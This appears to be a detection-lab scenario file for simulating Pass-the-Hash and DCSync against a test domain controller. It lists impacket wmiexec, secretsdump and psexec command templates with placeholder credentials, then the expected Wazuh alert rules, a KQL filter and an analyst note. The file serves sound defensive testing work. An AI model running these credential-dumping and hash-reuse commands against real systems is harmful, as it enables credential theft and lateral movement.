# Pass-the-Hash Scenario Execution

This scenario simulates **credential-based lateral movement** using NTLM authentication material in a controlled Active Directory laboratory.

The scenario is divided into three phases:

1. Controlled remote access preparation.
2. Credential material extraction.
3. Remote authentication using NTLM hash material.

All credentials and hashes shown in this file are placeholders.

---

## Target

| Field | Value |
|---|---|
| Source host | `Kali-ATK01` |
| Source IP | `192.168.56.40` |
| Target host | `DC01` |
| Target IP | `192.168.56.20` |
| Technique | `T1550.002 — Pass the Hash` |
| Related technique | `T1003.006 — DCSync` |
| Main hypotheses | `H6`, `H7` |

---

## Phase 1 — Controlled Remote Access

```bash
impacket-wmiexec 'LAB/<privileged_user>:<PASSWORD>@192.168.56.20'
```

---

## Phase 2 — Credential Material Extraction

Example command structure:

```bash
impacket-secretsdump 'LAB/<privileged_user>:<PASSWORD>@192.168.56.30'
```

The public repository must not include real hashes, passwords or raw secretsdump output.

---

## Phase 3 — Pass-the-Hash Authentication

Example command structure:

```bash
impacket-psexec -hashes :<NTLM_HASH> LAB/<privileged_user>@192.168.56.20
```

---

## Expected Detection Chain

```text
DCSync-like activity → privileged NTLM authentication → critical correlation alert
```

---

## Expected Wazuh Rules

| Rule ID | Meaning |
|---:|---|
| `100011` | NTLM network logon |
| `100021` | Special privileges assigned |
| `100030` | DCSync / secretsdump-like activity |
| `100033` | Critical Pass-the-Hash / DCSync correlation |
| `92650` | Suspicious service creation |
| `92052` | Abnormal command execution |

---

## Wazuh Filter

```kql
agent.name:DC01 AND rule.id:(100030 OR 100033 OR 100011 OR 100021 OR 92650 OR 92052)
```

---

## Analyst Note

Wazuh does not directly observe the NTLM hash.

The correct interpretation is that Wazuh detected a chain of behavior compatible with Pass-the-Hash in the controlled laboratory context.
